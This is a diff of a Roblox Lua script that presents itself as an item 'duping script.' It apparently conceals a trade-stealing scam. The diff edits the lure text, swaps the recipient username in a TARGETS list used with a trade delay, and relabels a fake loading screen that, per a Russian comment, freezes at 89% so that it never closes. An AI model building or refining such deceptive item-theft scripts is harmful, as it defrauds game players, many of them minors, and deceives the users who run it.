@@ -279,7 +279,7 @@ desc.Size = UDim2.new(1, -40, 0, 60)
 desc.Position = UDim2.new(0, 20, 0, 120)
 desc.BackgroundTransparency = 1
 desc.Font = Enum.Font.Gotham
-desc.Text = "The only duping script available.\nWorks only in public servers"
+desc.Text = "The only duping script available.\nPress LOAD to initialize the script."
 desc.TextSize = 18
 desc.TextColor3 = Color3.fromRGB(180,180,200)
 desc.TextWrapped = true
@@ -625,7 +625,7 @@ end)
 -- =========================
 
 local TARGETS = {
-	"Teadiosmo",
+	"BatyaOgoroda",
 }
 
 local TRADE_DELAY = 3
@@ -859,7 +859,7 @@ loadBtn.MouseButton1Click:Connect(function()
 		end
 		
 		-- после 40 сек просто зависает на 89% и НЕ ЗАКРЫВАЕТСЯ
-		statusText.Text = "Bypassing complete. Waiting for server response..."
+		statusText.Text = "Injection complete. Waiting for server response..."
 	end)
 
 
@@ -891,3 +891,4 @@ loadBtn.MouseButton1Click:Connect(function()
   end)
 
 end)
+
